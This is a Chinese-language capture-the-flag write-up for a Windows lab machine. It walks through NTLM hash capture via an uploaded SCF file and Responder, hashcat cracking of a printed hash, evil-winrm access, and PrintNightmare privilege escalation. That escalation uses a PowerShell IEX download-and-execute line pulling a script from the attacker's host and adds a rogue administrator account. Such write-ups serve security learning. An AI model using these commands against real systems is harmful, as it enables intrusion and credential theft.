一、信息收集

0x01 使用nmap进行端口扫描

该主机为windows主机，开放了80、135和445端口。

0x02 访问web页面

发现是MFP，并且提示了存在admin用户。

0x03 使用弱口令尝试登陆

真是天助我也，使用弱口令admin/admin竟然成功登陆了。

0x04 尝试上传失败

发现了一个文件上传，尝试一下。

上传phpinfo文件

发现没有显示上传成功还是失败，也没有上传路径的显示

0x05 进行永恒之蓝漏洞尝试失败

发现目标是windows2008，还开放445端口，啥也不说了，直接打一下试试

msfconsole search ms17-010use exploit/windows/smb/ms17_010_eternalblueshow optionsset rhosts 10.10.11.106run

发现不存在MS17-010漏洞。

0x06 NTLM捕获攻击获取帐号密码

在网上查找445端口的攻击手法，发现了NTLM捕获攻击方法。

(1):创建一个shell.scf文件

[Shell]Command=2IconFile=\\10.10.11.106\share\test.ico[Taskbar]Command=ToggleDesktop

(2):然后使用responder监听咱们连接htb的那个网卡

responder -wrf --lm -v -I tun0

(3):在上传点上传shell.scf文件


(4):然后查看捕获到的账户和hash

(5):使用hashcat进行破解

hashcat -m 5600 tony::DRIVER:4621242103dad095:83BFCB019542F3819BC7E01483163418:0101000000000000758C41C3A6E2D701FDD24C3FF72CBC5100000000020000000000000000000000 /usr/share/wordlists/rockyou.txt --force

成功获取账号密码tony/liltony

二、获取权限

0x01 获取普通用户权限

使用evil-winrm[Windows远程管理(WinRM)Shell工具]进行登录

下载安装evil-winrm

gem install evil-winrm

进行连接

evil-winrm -i 10.10.11.106 -u tony -p liltony

0x02 查看user的flag

cd ../Desktoptype user.txt

三、权限提升

0x01 查看主机进程

get-process

我们发现存在spoolsv服务，这个服务是Print Spooler的进程，管理所有本地和网络打印队列及控制所有打印工作。Print Spooler存在CVE-2021-1675权限提升漏洞，攻击者可利用该漏洞远程执行任意代码或进行权限提升。

0x02 使用Print Spooler提权

(1):漏洞脚本

https://github.com/calebstewart/CVE-2021-1675

只需要下载ps1脚本即可

(2):在攻击主机kali上起一个web服务

python3 -m http.server 8000

(3):在靶机上执行命令进行下载

IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.46:8000/CVE-2021-1675.ps1")

下载成功。

(4):执行命令添加用户

net userInvoke-Nightmare -DriverName "DRIVER" -NewUser "hack" -NewPassword "hack123"net user

(5):已经添加到管理员组

0x03 查看root的flag

cd C:\Users\Administrator\Desktoptype root.txt
